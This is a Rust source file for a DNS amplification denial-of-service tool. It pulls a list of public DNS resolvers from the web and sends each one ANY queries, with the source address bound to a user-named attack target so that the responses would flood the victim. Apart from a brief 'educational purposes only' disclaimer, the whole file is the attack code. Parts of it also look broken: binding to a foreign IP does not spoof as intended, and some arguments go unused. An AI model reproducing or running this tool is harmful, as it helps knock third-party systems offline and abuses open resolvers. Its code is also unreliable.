// DNS Amplification Script
// Author: David Stromberger
// License: MIT
// Version: 0.1.0
// Disclaimer: This script is for educational purposes only. I am not responsible for any damage caused by this script.

use clap::{arg, command, Parser};
use reqwest;
use trust_dns_resolver::config::ResolverOpts;
use std::fs::File;
use std::io::{self, BufRead, BufReader};
use std::net::{IpAddr, SocketAddr};
use std::str::FromStr;
use tokio;
use trust_dns_proto::rr::record_type::RecordType;
use trust_dns_resolver::lookup::Lookup;
use trust_dns_resolver::{
    config::{NameServerConfig, Protocol, ResolverConfig},
    error::ResolveResult,
    TokioAsyncResolver,
};

async fn get_public_dns_servers(url: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();
    let response = client.get(url).send().await?.text().await?;
    let servers = response.lines().map(|s| s.trim().to_string()).collect();
    Ok(servers)
}

fn read_public_dns_servers(file: &str) -> io::Result<Vec<String>> {
    let file = File::open(file)?;
    let reader = BufReader::new(file);

    let mut dns_servers = Vec::new();

    for line in reader.lines() {
        let line = line?;
        let line = line.trim();

        // Ignore empty lines and lines that start with a comment character
        if !line.is_empty() && !line.starts_with('#') {
            dns_servers.push(line.to_owned());
        }
    }

    Ok(dns_servers)
}

async fn send_dns_query(
    dns_server: IpAddr,
    domain: &str,
    source_ip: IpAddr,
    record_type: RecordType,
) -> ResolveResult<Lookup> {

    let dns_server_socket = SocketAddr::new(dns_server, 53);
    let source_ip_socket = SocketAddr::new(source_ip, 0);

    let mut resolver_config: ResolverConfig = ResolverConfig::default();
    resolver_config.add_name_server(NameServerConfig {
        socket_addr: dns_server_socket,
        protocol: Protocol::Udp,
        tls_dns_name: None,
        trust_nx_responses: false,
        bind_addr: Some(source_ip_socket),
    });

    let resolver = TokioAsyncResolver::tokio(resolver_config, ResolverOpts::default()).unwrap();
    
    // Send a DNS query to the resolver for the specified domain and record type
    let response = resolver.lookup(domain, record_type).await?;

    // Return the list of resource records in the response
    Ok(response)
}

async fn amplify(dns_server: &str, domain: &str, source_ip: &str, record_type: RecordType) -> Result<(), Box<dyn std::error::Error>> {
    let dns_server = IpAddr::from_str(dns_server)?;
    let source_ip = IpAddr::from_str(source_ip)?;
    let response = send_dns_query(dns_server, domain, source_ip, record_type);
    println!("{:?}", response.await?);
    Ok(())
}

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Target of the attack
    #[arg(required = true)]
    target: String,
    /// Record type to use
    #[arg(short = 'r', long = "record-type", required = false, default_value = "ANY")]
    record_type: Option<String>,
    /// List of dns servers to use
    #[arg(short, long, required = false)]
    server_list: Option<String>,
    /// Time the attack should run
    #[arg(short, long, required = false)]
    time: Option<u32>,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    let servers: Vec<String>;
    if args.server_list.is_none() {
        servers = get_public_dns_servers("https://public-dns.info/nameservers.txt").await?;
    } else {
        servers = read_public_dns_servers(args.server_list.as_ref().unwrap()).unwrap();
    }
    for server in &servers {
        let result = amplify(server, "google.com", &args.target, RecordType::ANY).await;
        if let Err(e) = result {
            println!("Error sending query to {}: {}", server, e);
        }
    }
    Ok(())
}
